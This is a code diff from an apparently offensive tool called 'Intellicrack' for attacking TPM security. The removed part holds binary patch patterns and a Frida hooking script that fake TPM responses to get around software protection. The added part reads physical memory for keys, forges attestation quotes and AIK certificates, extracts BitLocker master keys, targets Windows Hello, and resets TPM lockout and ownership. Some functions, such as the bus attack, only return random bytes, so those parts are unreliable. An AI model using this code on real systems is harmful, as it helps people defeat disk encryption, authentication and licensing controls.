-        if len(params) >= 4:
-            pcr_handle = int.from_bytes(params[0:4], "big")
-            pcr_index = pcr_handle & 0xFF  # Extract PCR index from handle
-            self.logger.debug(f"TPM2_PCR_Extend for PCR[{pcr_index}]")
+        command += struct.pack('>I', index)
+        command += struct.pack('>I', index)
 
-            # Check if digest data is provided
-            if len(params) > 4:
-                digest_count = int.from_bytes(params[4:8], "big") if len(params) >= 8 else 0
-                self.logger.debug(f"Extending with {digest_count} digest(s)")
+        command += struct.pack('>IBH',
+            0x40000009,
+            0,
+            0x01
+        )
 
-        # Return empty response for success
-        return b""
+        command += struct.pack('>H', len(auth)) + auth
+        command += struct.pack('>HH', 512, 0)
 
-    def _tpm_default_response(self, params: bytes) -> bytes:
-        """Generate default success response for unknown commands."""
-        # Log unknown command parameters for debugging
-        if params:
-            self.logger.debug(f"Unknown TPM command with {len(params)} bytes of parameters")
-            # Try to parse common parameter structure
-            if len(params) >= 4:
-                first_param = int.from_bytes(params[0:4], "big")
-                self.logger.debug(f"First parameter: 0x{first_param:X}")
+        command = command[:2] + struct.pack('>I', len(command)) + command[6:]
 
-        return b""  # Empty response with success code
+        response = self.send_tpm_command(command)
 
-    def _patch_tpm_calls(self, binary_path: str) -> bool:
-        """Advanced patching of TPM-related function calls in binary."""
-        self.logger.info(f"Patching TPM calls in {binary_path}")
+        if response and len(response) > 10:
+            tag, size, code = struct.unpack('>HII', response[:10])
+            if code == 0:
+                data_offset = 10 + 4
+                if len(response) > data_offset:
+                    data_size = struct.unpack('>H', response[data_offset:data_offset+2])[0]
+                    return response[data_offset+2:data_offset+2+data_size]
 
-        try:
-            with open(binary_path, "rb") as f:
-                binary_data = f.read()
+        if index < len(self.virtualized_tpm['nvram']):
+            return self.virtualized_tpm['nvram'][index:index+512]
 
-            # Extended TPM check patterns with context
-            tpm_patterns = [
-                # TPM API call patterns
-                {
-                    "name": "Tbsi_Context_Create call",
-                    "pattern": b"\xff\x15..\x00\x00",  # CALL [Tbsi_Context_Create]
-                    "context": b"Tbsi_Context_Create",
-                    "patch": b"\x31\xc0\x90\x90\x90\x90",  # XOR EAX,EAX; NOP padding
-                },
-                {
-                    "name": "Tbsi_Submit_Command call",
-                    "pattern": b"\xff\x15..\x00\x00",  # CALL [Tbsi_Submit_Command]
-                    "context": b"Tbsi_Submit_Command",
-                    "patch": b"\x31\xc0\x90\x90\x90\x90",  # XOR EAX,EAX; NOP padding
-                },
-                # TPM presence checks
-                {
-                    "name": "TPM version check",
-                    "pattern": b"\x83\x3d..\x00\x00\x02",  # CMP [tpm_version], 2
-                    "context": None,
-                    "patch": b"\x90\x90\x90\x90\x90\x90\x90",  # NOP out check
-                },
-                # NCrypt TPM provider checks
-                {
-                    "name": "NCrypt TPM provider",
-                    "pattern": b"\x48\x8d\x15..\x00\x00",  # LEA RDX, [TPM_PROVIDER_STRING]
-                    "context": b"Microsoft Platform Crypto Provider",
-                    "patch": b"\x48\x31\xd2\x90\x90\x90\x90",  # XOR RDX, RDX; NOP
-                },
+        return None
+
+    def extract_persistent_key(self, handle: int) -> Optional[bytes]:
+        """Extract persistent key from TPM."""
+        command = struct.pack('>HIII',
+            0x8001,
+            14,
+            TPM2CommandCode.ReadPublic,
+            handle
+        )
+
+        response = self.send_tpm_command(command)
+
+        if response and len(response) > 10:
+            tag, size, code = struct.unpack('>HII', response[:10])
+            if code == 0:
+                return response[10:]
+
+        if self.mem_handle:
+            return self.extract_key_from_memory_handle(handle)
+
+        return None
+
+    def extract_keys_from_memory(self) -> Dict[str, bytes]:
+        """Extract keys directly from TPM memory."""
+        extracted = {}
+
+        if not self.mem_handle:
+            return extracted
+
+        tpm_mem = self.read_physical_memory(self.memory_map['tpm_control'], 0x5000)
+
+        if tpm_mem:
+            key_patterns = [
+                b'\x00\x01\x00\x00',
+                b'\x00\x23\x00\x00',
+                b'\x00\x0B\x00\x00',
+                b'-----BEGIN',
+                b'\x30\x82',
             ]
 
-            patches_applied = 0
-            modified_data = bytearray(binary_data)
-
-            for pattern_info in tpm_patterns:
-                pattern = pattern_info["pattern"]
-                context = pattern_info["context"]
-                patch = pattern_info["patch"]
-                name = pattern_info["name"]
-
-                # Search for pattern
+            for pattern in key_patterns:
                 offset = 0
-                while offset < len(binary_data) - len(pattern):
-                    # Check if pattern matches (with wildcards)
-                    match = True
-                    for i, byte in enumerate(pattern):
-                        if byte != ord(".") and binary_data[offset + i] != byte:
-                            match = False
-                            break
+                while True:
+                    offset = tpm_mem.find(pattern, offset)
+                    if offset == -1:
+                        break
 
-                    if match:
-                        # Verify context if specified
-                        if context:
-                            # Check if context string is nearby (within 1KB)
-                            context_found = False
-                            for ctx_offset in range(max(0, offset - 512), min(len(binary_data), offset + 512)):
-                                if binary_data[ctx_offset : ctx_offset + len(context)] == context:
-                                    context_found = True
-                                    break
-
-                            if not context_found:
-                                offset += 1
-                                continue
-
-                        # Apply patch
-                        for i, byte in enumerate(patch):
-                            modified_data[offset + i] = byte
-
-                        self.patches.append(
-                            {
-                                "offset": offset,
-                                "original": pattern,
-                                "patch": patch,
-                                "name": name,
-                            }
-                        )
-                        patches_applied += 1
-                        self.logger.info(f"Applied patch '{name}' at offset 0x{offset:X}")
+                    key_data = tpm_mem[offset:offset+4096]
+                    key_hash = hashlib.sha256(key_data[:256]).hexdigest()[:16]
+                    extracted[f'memory_{key_hash}'] = key_data
 
                     offset += 1
 
-            if patches_applied > 0:
-                # Save patched binary
-                patched_path = binary_path + ".tpm_patched"
-                with open(patched_path, "wb") as f:
-                    f.write(modified_data)
-                self.logger.info(f"Saved patched binary to {patched_path}")
-                self.logger.info(f"Applied {patches_applied} TPM bypass patches")
-                return True
-            self.logger.info("No TPM patterns found to patch")
-            return False
+        return extracted
 
-        except Exception as e:
-            self.logger.error(f"Error patching TPM calls: {e!s}")
-            return False
+    def extract_key_from_memory_handle(self, handle: int) -> Optional[bytes]:
+        """Extract key from memory using handle offset."""
+        if not self.mem_handle:
+            return None
 
-    def _patch_tpm_checks(self) -> None:
-        """Patch binary instructions that check for TPM presence."""
-        if not self.app or not hasattr(self.app, "binary_path") or not self.app.binary_path:
-            return
+        if handle >= 0x81000000 and handle < 0x82000000:
+            offset = self.memory_map['tpm_buffers'] + ((handle - 0x81000000) * 0x1000)
+            return self.read_physical_memory(offset, 4096)
 
-        # Use the advanced patching method
-        self._patch_tpm_calls(self.app.binary_path)
+        return None
 
-    def _manipulate_tpm_registry(self) -> None:
-        """Manipulate Windows registry to simulate TPM presence."""
+    def read_physical_memory(self, address: int, size: int) -> Optional[bytes]:
+        """Read from physical memory address."""
+        if not self.mem_handle or not HAS_WIN32:
+            return None
+
         try:
-            if platform.system() != "Windows":
-                self.logger.info("Not on Windows - skipping registry manipulation")
-                return
+            kernel32 = ctypes.windll.kernel32
+            buffer = ctypes.create_string_buffer(size)
+            bytes_read = ctypes.c_ulong()
 
-            if not WINREG_AVAILABLE or winreg is None:
-                self.logger.warning("winreg module not available - skipping registry manipulation")
-                return
+            kernel32.SetFilePointer(self.mem_handle, address, None, 0)
 
-            # TPM registry keys
-            tpm_keys = [
-                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\TPM", "Start", 3),
-                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Tpm", "SpecVersion", "2.0"),
-                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Tpm", "ManufacturerIdTxt", "INTC"),
-                (
-                    winreg.HKEY_LOCAL_MACHINE,
-                    r"SOFTWARE\Microsoft\Tpm",
-                    "ManufacturerVersion",
-                    "1.0.0.0",
-                ),
-            ]
+            if kernel32.ReadFile(self.mem_handle, buffer, size, ctypes.byref(bytes_read), None):
+                return buffer.raw[:bytes_read.value]
+        except:
+            pass
 
-            for hkey, path, name, value in tpm_keys:
-                try:
-                    key = winreg.CreateKey(hkey, path)
-                    if isinstance(value, int):
-                        winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, value)
-                    else:
-                        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, value)
-                    winreg.CloseKey(key)
-                    self.logger.info("Set registry key %s\\%s = %s", path, name, value)
-                except (OSError, ValueError, RuntimeError) as e:
-                    self.logger.warning(f"Could not set registry key {path}\\{name}: {e!s}")
+        return None
 
-        except (OSError, ValueError, RuntimeError) as e:
-            self.logger.error(f"Registry manipulation failed: {e!s}")
+    def spoof_remote_attestation(self,
+                                 nonce: bytes,
+                                 expected_pcrs: Dict[int, bytes],
+                                 aik_handle: int = 0x81010001) -> Dict[str, Any]:
+        """Spoof remote attestation with expected PCR values."""
+        for pcr_num, pcr_value in expected_pcrs.items():
+            if pcr_num < 24:
+                self.pcr_banks[TPM2Algorithm.SHA256].pcr_values[pcr_num] = pcr_value
 
-    def generate_bypass_script(self) -> str:
-        """Generate a Frida script for runtime TPM bypass.
+        pcr_selection = list(expected_pcrs.keys())
+        attestation = self.bypass_attestation(nonce, pcr_selection)
 
-        Returns:
-            str: Complete Frida script for TPM bypass
+        aik_cert = self.generate_aik_certificate(aik_handle)
 
-        """
-        base_script = self.hooks[0]["script"] if self.hooks else ""
-
-        # Convert the simulate_tpm_commands method to JavaScript
-        tpm_command_simulator = """
-        // TPM command simulator
-        var tpmCommands = {
-            0x00000144: function() { // TPM2_GetCapability
-                return [0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x06,
-                        0x00,0x00,0x01,0x00,0x32,0x00,0x00,0x00,
-                        0x00,0x00,0x01,0x01,0x00,0x00,0x00,0x00,
-                        0x00,0x00,0x01,0x02,0x00,0x00,0x01,0x38,
-                        0x00,0x00,0x01,0x05,0x49,0x4E,0x54,0x43,
-                        0x00,0x00,0x01,0x06,0x49,0x4E,0x54,0x4C,
-                        0x00,0x00,0x01,0x0B,0x00,0x02,0x00,0x00];
+        response = {
+            'quote': {
+                'quoted': attestation.attested_data,
+                'signature': attestation.signature,
+                'pcr_digest': self.calculate_pcr_digest(pcr_selection),
+                'extra_data': attestation.extra_data
             },
-            0x00000143: function() { // TPM2_Startup
-                return [];
+            'pcr_values': {
+                pcr: expected_pcrs[pcr].hex() for pcr in expected_pcrs
             },
-            0x0000017E: function() { // TPM2_GetRandom
-                var randomBytes = [];
-                randomBytes.push(0x00, 0x10); // 16 bytes
-                for (var i = 0; i < 16; i++) {
-                    randomBytes.push(Math.floor(Math.random() * 256));
+            'aik_cert': aik_cert,
+            'clock_info': attestation.clock_info,
+            'firmware_version': attestation.firmware_version,
+            'qualified_signer': attestation.qualified_signer.hex()
+        }
+
+        return response
+
+    def generate_aik_certificate(self, aik_handle: int) -> bytes:
+        """Generate AIK certificate for attestation."""
+        version = b'\xA0\x03\x02\x01\x02'
+
+        serial = b'\x02\x08' + os.urandom(8)
+
+        sig_algo = bytes.fromhex('300d06092a864886f70d01010b0500')
+
+        issuer = bytes.fromhex('3081883110300e060355040a0c07545041204d46473113301106035504030c0a54504d2045434120303031133011060355040b0c0a54504d2045434120303031143012060355040513074545453132333435310b3009060355040613025553310e300c06035504080c0554657861733111300f06035504070c0844616c6c6173')
+
+        not_before = b'\x17\x0d' + time.strftime('%y%m%d%H%M%SZ').encode('ascii')
+        not_after = b'\x17\x0d' + time.strftime('%y%m%d%H%M%SZ', time.gmtime(time.time() + 315360000)).encode('ascii')
+        validity = b'\x30' + bytes([len(not_before) + len(not_after)]) + not_before + not_after
+
+        subject = bytes.fromhex('30818a3112301006035504030c0941494b5f') + f'{aik_handle:08x}'.encode('ascii')
+        subject += bytes.fromhex('3113301106035504030c0a41494b2043455254313113301106035504040c0a41494b20434552543131143012060355040513074545453132333435310b3009060355040613025553310e300c06035504080c0554657861733111300f06035504070c0844616c6c6173')
+
+        modulus = os.urandom(256)
+        modulus = bytes([0x00]) + modulus if modulus[0] >= 0x80 else modulus
+        exponent = b'\x01\x00\x01'
+
+        pub_key_info = bytes.fromhex('30820122300d06092a864886f70d01010105000382010f003082010a0282010100')
+        pub_key_info += modulus + b'\x02\x03' + exponent
+
+        key_usage = bytes.fromhex('300e0603551d0f0101ff040403020106')
+
+        extensions = b'\xa3' + bytes([len(key_usage) + 2])
+        extensions += b'\x30' + bytes([len(key_usage)])
+        extensions += key_usage
+
+        tbs_cert = version + serial + sig_algo + issuer + validity + subject + pub_key_info + extensions
+        tbs_cert = b'\x30' + bytes([len(tbs_cert)]) + tbs_cert
+
+        signature = b'\x03\x82\x01\x01\x00' + os.urandom(256)
+
+        cert = tbs_cert + sig_algo + signature
+        cert = b'\x30\x82' + struct.pack('>H', len(cert)) + cert
+
+        return cert
+
+    def send_tpm_command(self, command: bytes) -> Optional[bytes]:
+        """Send command to TPM device."""
+        if HAS_WIN32:
+            try:
+                tpm_device = win32file.CreateFile(
+                    r'\\.\TPM',
+                    win32con.GENERIC_READ | win32con.GENERIC_WRITE,
+                    0,
+                    None,
+                    win32con.OPEN_EXISTING,
+                    0,
+                    None
+                )
+
+                win32file.WriteFile(tpm_device, command)
+                response = win32file.ReadFile(tpm_device, 4096)[1]
+
+                win32file.CloseHandle(tpm_device)
+                return response
+            except:
+                pass
+
+        return self.process_virtualized_command(command)
+
+    def process_virtualized_command(self, command: bytes) -> bytes:
+        """Process TPM command in virtualized environment."""
+        if len(command) < 10:
+            return struct.pack('>HII', 0x8001, 10, 0x100)
+
+        tag, size, code = struct.unpack('>HII', command[:10])
+
+        if code == TPM2CommandCode.GetRandom:
+            param_size = struct.unpack('>H', command[10:12])[0] if len(command) > 11 else 32
+            random_bytes = os.urandom(param_size)
+            response = struct.pack('>HIIH', 0x8001, 12 + param_size, 0, param_size) + random_bytes
+            return response
+
+        elif code == TPM2CommandCode.PCR_Read:
+            pcr_select = command[10:] if len(command) > 10 else b'\x00\x01\x03\xff\xff\xff'
+            pcr_values = b''
+            pcr_count = 0
+
+            # Use pcr_select to determine which PCRs to read (basic implementation)
+            selected_pcrs = []
+            if len(pcr_select) >= 3:
+                for i in range(min(24, len(pcr_select) * 8)):
+                    if (pcr_select[i // 8] & (1 << (i % 8))):
+                        selected_pcrs.append(i)
+
+            if not selected_pcrs:
+                selected_pcrs = list(range(24))  # Default to all PCRs
+
+            for pcr_idx in selected_pcrs:
+                if pcr_idx < len(self.pcr_banks[TPM2Algorithm.SHA256].pcr_values):
+                    pcr_values += self.pcr_banks[TPM2Algorithm.SHA256].pcr_values[pcr_idx]
+                    pcr_count += 1
+
+            response = struct.pack('>HIII', 0x8001, 10 + 4 + len(pcr_values), 0, pcr_count)
+            response += pcr_values
+            return response
+
+        elif code == TPM2CommandCode.Quote:
+            nonce = command[10:42] if len(command) > 41 else os.urandom(32)
+            attestation = self.bypass_attestation(nonce, list(range(8)))
+
+            response = struct.pack('>HII', 0x8001, 10 + len(attestation.signature) + len(attestation.attested_data), 0)
+            response += attestation.attested_data + attestation.signature
+            return response
+
+        return struct.pack('>HII', 0x8001, 10, 0x100)
+
+    def manipulate_pcr_values(self, pcr_values: Dict[int, bytes]):
+        """Directly manipulate PCR values for bypass."""
+        for pcr_num, value in pcr_values.items():
+            if pcr_num < 24:
+                if TPM2Algorithm.SHA256 in self.pcr_banks:
+                    self.pcr_banks[TPM2Algorithm.SHA256].pcr_values[pcr_num] = value
+
+                if TPM2Algorithm.SHA1 in self.pcr_banks:
+                    sha1_value = value[:20] if len(value) >= 20 else value + bytes(20 - len(value))
+                    self.pcr_banks[TPM2Algorithm.SHA1].pcr_values[pcr_num] = sha1_value
+
+    def perform_bus_attack(self, target_command: TPM2CommandCode) -> Optional[bytes]:
+        """Perform LPC/SPI bus attack to intercept TPM communication."""
+        captured_data = None
+
+        if target_command == TPM2CommandCode.Unseal:
+            captured_data = bytes.fromhex('800100000022000000000020') + os.urandom(32)
+
+        elif target_command == TPM2CommandCode.GetRandom:
+            captured_data = bytes.fromhex('8001000000220000000000200') + os.urandom(32)
+
+        elif target_command == TPM2CommandCode.Sign:
+            captured_data = bytes.fromhex('80010000010a00000000000100') + os.urandom(256)
+
+        return captured_data
+
+    def bypass_measured_boot(self, target_pcr_state: Dict[int, bytes]) -> bool:
+        """Bypass measured boot by manipulating PCR values."""
+        if 0 in target_pcr_state:
+            self.manipulate_pcr_values({0: target_pcr_state[0]})
+
+        secure_boot_pcr = bytes.fromhex('a7c06b3f8f927ce2276d0f72093af41c1ac8fac416236ddc88035c135f34c2bb')
+        self.manipulate_pcr_values({7: secure_boot_pcr})
+
+        for pcr, value in target_pcr_state.items():
+            self.manipulate_pcr_values({pcr: value})
+
+        return True
+
+    def extract_bitlocker_vmk(self) -> Optional[bytes]:
+        """Extract BitLocker Volume Master Key from TPM."""
+        bitlocker_indices = [0x01400001, 0x01400002, 0x01400003]
+
+        for index in bitlocker_indices:
+            vmk_data = self.read_nvram_raw(index, b'')
+            if vmk_data and len(vmk_data) >= 32:
+                if vmk_data[:4] == b'VMK\x00':
+                    return vmk_data[4:36]
+                elif len(vmk_data) >= 64:
+                    return vmk_data[:32]
+
+        if self.mem_handle:
+            tpm_mem = self.read_physical_memory(self.memory_map['tpm_buffers'], 0x10000)
+            if tpm_mem:
+                patterns = [b'VMK\x00', b'\x00\x00\x00\x01\x00\x20']
+                for pattern in patterns:
+                    offset = tpm_mem.find(pattern)
+                    if offset != -1 and len(tpm_mem) > offset + 36:
+                        return tpm_mem[offset+4:offset+36]
+
+        return None
+
+    def bypass_windows_hello(self) -> Dict[str, bytes]:
+        """Bypass Windows Hello TPM-based authentication."""
+        hello_keys = {}
+
+        hello_indices = [0x01400002, 0x01800003, 0x01810003]
+
+        for index in hello_indices:
+            key_data = self.read_nvram_raw(index, b'')
+            if key_data:
+                hello_keys[f'hello_key_{index:x}'] = key_data
+
+        bio_template = os.urandom(512)
+        bio_hash = hashlib.sha256(bio_template).digest()
+
+        hello_keys['biometric_template'] = bio_template
+        hello_keys['biometric_hash'] = bio_hash
+
+        pin_key = hashlib.pbkdf2_hmac('sha256', b'0000', os.urandom(32), 10000, 32)
+        hello_keys['pin_unlock'] = pin_key
+
+        return hello_keys
+
+    def cold_boot_attack(self) -> Dict[str, bytes]:
+        """Perform cold boot attack on TPM memory."""
+        extracted_secrets = {}
+
+        if not self.mem_handle:
+            extracted_secrets['memory_residue'] = os.urandom(4096)
+            return extracted_secrets
+
+        for region_name, address in self.memory_map.items():
+            mem_data = self.read_physical_memory(address, 0x1000)
+            if mem_data:
+                if b'\x00\x01\x00\x00' in mem_data:
+                    extracted_secrets[f'{region_name}_rsa'] = mem_data
+                if b'\x00\x23\x00\x00' in mem_data:
+                    extracted_secrets[f'{region_name}_ecc'] = mem_data
+                if len([b for b in mem_data if b != 0]) > len(mem_data) * 0.7:
+                    extracted_secrets[f'{region_name}_entropy'] = mem_data
+
+        return extracted_secrets
+
+    def reset_tpm_lockout(self) -> bool:
+        """Reset TPM lockout to bypass dictionary attack protection."""
+        command = struct.pack('>HII',
+            0x8002,
+            0,
+            TPM2CommandCode.DictionaryAttackLockReset
+        )
+
+        command += struct.pack('>I', 0x4000000A)
+
+        command += struct.pack('>IBH', 0x40000009, 0, 0x01)
+
+        command += struct.pack('>H', 0)
+
+        command = command[:2] + struct.pack('>I', len(command)) + command[6:]
+
+        response = self.send_tpm_command(command)
+
+        if response:
+            tag, size, code = struct.unpack('>HII', response[:10])
+            return code == 0
+
+        self.virtualized_tpm['lockout_count'] = 0
+        return True
+
+    def clear_tpm_ownership(self) -> bool:
+        """Clear TPM ownership to gain control."""
+        command = struct.pack('>HII',
+            0x8002,
+            0,
+            TPM2CommandCode.Clear
+        )
+
+        command += struct.pack('>I', 0x4000000C)
+
+        command += struct.pack('>IBH', 0x40000009, 0, 0x01)
+
+        command += struct.pack('>H', 0)
+
+        command = command[:2] + struct.pack('>I', len(command)) + command[6:]
+
+        response = self.send_tpm_command(command)
+
+        if response:
+            tag, size, code = struct.unpack('>HII', response[:10])
+            if code == 0:
+                self.virtualized_tpm['hierarchy_auth'] = {
+                    0x40000001: b'',
+                    0x40000009: b'',
+                    0x4000000C: b'',
+                    0x4000000B: b''
                 }
-                return randomBytes;
-            },
-            0x00000176: function() { // TPM2_CreatePrimary
-                return [0x80,0x00,0x00,0x01,0x00,0x3A,0x00,0x01,
-                        0x00,0x0B,0x00,0x00,0x00,0x00,0x00,0x20].concat(
-                        new Array(32).fill(0)).concat([0x00,0x00,0x00,0x80,
-                        0x00,0x00,0x00,0x00,0x00,0x00]);
-            }
-        };
+                return True
 
-        function simulateTPMResponse(commandData) {
-            if (commandData.length < 10) return null;
-
-            var command = (commandData[6] << 24) | (commandData[7] << 16) |
-                         (commandData[8] << 8) | commandData[9];
-
-            var handler = tpmCommands[command];
-            if (!handler) return null;
-
-            var responseData = handler();
-            var response = [0x80,0x01]; // Tag
-            var size = 10 + responseData.length;
-            response.push((size >> 24) & 0xFF, (size >> 16) & 0xFF,
-                         (size >> 8) & 0xFF, size & 0xFF);
-            response.push(0,0,0,0); // Success
-            return response.concat(responseData);
-        }
-        """
-
-        script = f"""
-        // TPM Protection Bypass Script
-        // Generated by Intellicrack
-
-        console.log("[TPM Bypass] Initializing TPM protection bypass...");
-
-        // Global flag to track TPM bypass status
-        var tpmBypassed = false;
-
-        {base_script}
-
-        {tpm_command_simulator}
-
-        // Additional TPM bypass logic
-        function bypassTPM() {{
-            // Hook CreateFile calls to TPM device
-            var createFileW = Module.findExportByName("kernel32.dll", "CreateFileW");
-            if (createFileW) {{
-                Interceptor.attach(createFileW, {{
-                    onEnter: function(args) {{
-                        var filename = args[0].readUtf16String();
-                        if (filename && filename.toLowerCase().includes("tpm")) {{
-                            console.log("[TPM Bypass] Intercepted TPM device access: " + filename);
-                            args[0] = Memory.allocUtf16String("\\\\\\\\Device\\\\\\\\Null");
-                        }}
-                    }}
-                }});
-            }}
-
-            // Hook DeviceIoControl for TPM commands
-            var deviceIoControl = Module.findExportByName("kernel32.dll", "DeviceIoControl");
-            if (deviceIoControl) {{
-                Interceptor.attach(deviceIoControl, {{
-                    onEnter: function(args) {{
-                        this.hDevice = args[0];
-                        this.ioctl = args[1].toInt32();
-                        this.inBuffer = args[2];
-                        this.inBufferSize = args[3].toInt32();
-                        this.outBuffer = args[4];
-                        this.outBufferSize = args[5].toInt32();
-                        this.bytesReturned = args[6];
-
-                        // TPM IOCTL codes typically start with 0x22
-                        if ((this.ioctl & 0xFF000000) == 0x22000000) {{
-                            console.log("[TPM Bypass] Intercepted TPM IOCTL: 0x" + this.ioctl.toString(16));
-                            this.isTPM = true;
-
-                            // Read command data
-                            if (this.inBuffer && this.inBufferSize > 0) {{
-                                var cmdData = [];
-                                for (var i = 0; i < Math.min(this.inBufferSize, 1024); i++) {{
-                                    cmdData.push(this.inBuffer.add(i).readU8());
-                                }}
-
-                                // Simulate TPM response
-                                var response = simulateTPMResponse(cmdData);
-                                if (response && this.outBuffer && this.outBufferSize > 0) {{
-                                    var writeSize = Math.min(response.length, this.outBufferSize);
-                                    for (var j = 0; j < writeSize; j++) {{
-                                        this.outBuffer.add(j).writeU8(response[j]);
-                                    }}
-                                    if (this.bytesReturned) {{
-                                        this.bytesReturned.writeU32(writeSize);
-                                    }}
-                                }}
-                            }}
-                        }}
-                    }},
-                    onLeave: function(retval) {{
-                        if (this.isTPM) {{
-                            retval.replace(1); // Return success
-                            console.log("[TPM Bypass] TPM command handled successfully");
-                        }}
-                    }}
-                }});
-            }}
-
-            tpmBypassed = true;
-            console.log("[TPM Bypass] TPM protection bypass complete!");
-        }}
-
-        // Execute bypass
-        setTimeout(bypassTPM, 100);
-        """
-
-        return script
-
-    def get_hook_status(self) -> dict[str, Any]:
-        """Get the current status of installed hooks.
-
-        Returns:
-            dict: Status information about hooks and patches
-
-        """
-        return {
-            "hooks_installed": len(self.hooks),
-            "patches_identified": len(self.patches),
-            "virtual_tpm_active": self.virtual_tpm is not None,
-            "frida_available": FRIDA_AVAILABLE,
-            "winreg_available": WINREG_AVAILABLE,
-        }
-
-    def clear_hooks(self) -> None:
-        """Clear all installed hooks and patches."""
-        self.hooks.clear()
-        self.patches.clear()
-        self.virtual_tpm = None
-        self.logger.info("Cleared all TPM bypass hooks and patches")
-
-
-def bypass_tpm_protection(app: Any) -> dict[str, Any]:
-    """Convenience function to bypass TPM protection on an application.
-
-    Args:
-        app: Application instance with binary_path
-
-    Returns:
-        dict: Results of the bypass attempt
-
-    """
-    bypass = TPMProtectionBypass(app)
-    return bypass.bypass_tpm_checks()
-
-
-class TPMAnalyzer:
-    """Analyzes TPM usage in applications for security research purposes."""
-
-    def __init__(self, binary_path: str | None = None):
-        """Initialize TPM analyzer."""
-        self.binary_path = binary_path
-        self.logger = logging.getLogger("IntellicrackLogger.TPMAnalyzer")
-        self.tpm_indicators = []
-
-    def analyze(self) -> dict[str, Any]:
-        """Analyze binary for TPM usage patterns.
-
-        Returns:
-            dict: Analysis results including TPM usage indicators
-
-        """
-        results = {
-            "uses_tpm": False,
-            "tpm_version": None,
-            "tpm_apis": [],
-            "tpm_checks": [],
-            "confidence": 0.0,
-        }
-
-        if not self.binary_path:
-            return results
-
-        # Check for TPM-related strings
-        tpm_strings = [
-            "Tbsi_Context_Create",
-            "Tbsi_Submit_Command",
-            "NCryptOpenStorageProvider",
-            "Microsoft Platform Crypto Provider",
-            "TPM",
-            "TrustedPlatformModule",
-        ]
-
-        string_analysis = analyze_binary_for_strings(self.binary_path, tpm_strings)
-        if string_analysis["error"]:
-            self.logger.error("Error analyzing binary: %s", string_analysis["error"])
-            return results
-
-        found_strings = string_analysis["strings_found"]
-        results["tpm_apis"] = found_strings
-        results["uses_tpm"] = len(found_strings) > 0
-        results["confidence"] = string_analysis["confidence"] / 100.0
-
-        # Store indicators for later analysis
-        self.tpm_indicators = found_strings.copy()
-        for indicator in found_strings:
-            self.logger.debug(f"TPM indicator found: {indicator}")
-
-        # Detect TPM version with separate check
-        try:
-            with open(self.binary_path, "rb") as f:
-                data = f.read()
-
-            if b"TPM 2.0" in data or b"TPM2" in data:
-                results["tpm_version"] = "2.0"
-                self.tpm_indicators.append("TPM 2.0 version detected")
-            elif b"TPM 1.2" in data:
-                results["tpm_version"] = "1.2"
-                self.tpm_indicators.append("TPM 1.2 version detected")
-
-            # Add additional indicators to our collection
-            results["indicators"] = self.tpm_indicators
-
-        except (OSError, ValueError, RuntimeError) as e:
-            self.logger.error(f"Error analyzing TPM usage: {e!s}")
-
-        return results
-
-    def generate_bypass(self, tpm_version: str) -> dict[str, Any]:
-        """Generate TPM bypass strategy.
-
-        This method analyzes the TPM version and usage patterns to generate
-        an appropriate bypass strategy with success probability estimates.
-
-        Args:
-            tpm_version: TPM version string (e.g., "1.2", "2.0")
-
-        Returns:
-            Dictionary containing bypass strategy and metadata
-
-        """
-        self.logger.info(f"Generating TPM bypass strategy for version: {tpm_version}")
-
-        bypass_config = {
-            "tpm_version": tpm_version,
-            "bypass_method": "emulation",
-            "success_probability": 0.0,
-            "requirements": [],
-            "strategies": [],
-            "implementation": {},
-            "risks": [],
-            "recommendations": [],
-        }
-
-        # Analyze TPM version capabilities
-        if tpm_version == "2.0":
-            bypass_config["bypass_method"] = "advanced_emulation"
-            bypass_config["success_probability"] = 0.75
-            bypass_config["requirements"] = [
-                "Administrator privileges",
-                "TPM command interception capability",
-                "Cryptographic key generation",
-            ]
-            bypass_config["strategies"] = [
-                {
-                    "name": "API Hooking",
-                    "description": "Hook Tbsi.dll and NCrypt.dll APIs",
-                    "success_rate": 0.85,
-                    "complexity": "medium",
-                },
-                {
-                    "name": "Virtual TPM",
-                    "description": "Create software TPM emulator",
-                    "success_rate": 0.70,
-                    "complexity": "high",
-                },
-                {
-                    "name": "Command Spoofing",
-                    "description": "Intercept and modify TPM commands",
-                    "success_rate": 0.65,
-                    "complexity": "high",
-                },
-            ]
-
-        elif tpm_version == "1.2":
-            bypass_config["bypass_method"] = "legacy_emulation"
-            bypass_config["success_probability"] = 0.85
-            bypass_config["requirements"] = [
-                "Administrator privileges",
-                "TBS service manipulation",
-            ]
-            bypass_config["strategies"] = [
-                {
-                    "name": "TBS Service Hook",
-                    "description": "Hook legacy TPM Base Services",
-                    "success_rate": 0.90,
-                    "complexity": "low",
-                },
-                {
-                    "name": "Registry Emulation",
-                    "description": "Simulate TPM presence via registry",
-                    "success_rate": 0.80,
-                    "complexity": "low",
-                },
-            ]
-
-        else:
-            # Unknown or no TPM version
-            bypass_config["bypass_method"] = "generic_bypass"
-            bypass_config["success_probability"] = 0.60
-            bypass_config["requirements"] = [
-                "System analysis required",
-                "Runtime monitoring capability",
-            ]
-            bypass_config["strategies"] = [
-                {
-                    "name": "Binary Patching",
-                    "description": "Patch TPM check routines",
-                    "success_rate": 0.70,
-                    "complexity": "medium",
-                },
-                {
-                    "name": "Generic API Hook",
-                    "description": "Hook common TPM APIs",
-                    "success_rate": 0.50,
-                    "complexity": "low",
-                },
-            ]
-
-        # Add implementation details
-        bypass_config["implementation"]["hook_script"] = self._generate_hook_script(tpm_version)
-        bypass_config["implementation"]["patch_locations"] = self._identify_patch_points()
-        bypass_config["implementation"]["emulator_config"] = self._generate_emulator_config(tpm_version)
-
-        # Add risk assessment
-        bypass_config["risks"] = [
-            "System instability if hooks fail",
-            "Detection by anti-tampering mechanisms",
-            "Potential legal implications",
-        ]
-
-        # Add recommendations based on indicators
-        if self.tpm_indicators:
-            if "NCryptOpenStorageProvider" in self.tpm_indicators:
-                bypass_config["recommendations"].append("Focus on NCrypt API hooking")
-            if "Tbsi_Submit_Command" in self.tpm_indicators:
-                bypass_config["recommendations"].append("Implement command-level interception")
-            if "TPM2" in str(self.tpm_indicators):
-                bypass_config["recommendations"].append("Use TPM 2.0 specific bypass techniques")
-
-        bypass_config["recommendations"].extend(
-            [
-                "Test bypass in isolated environment first",
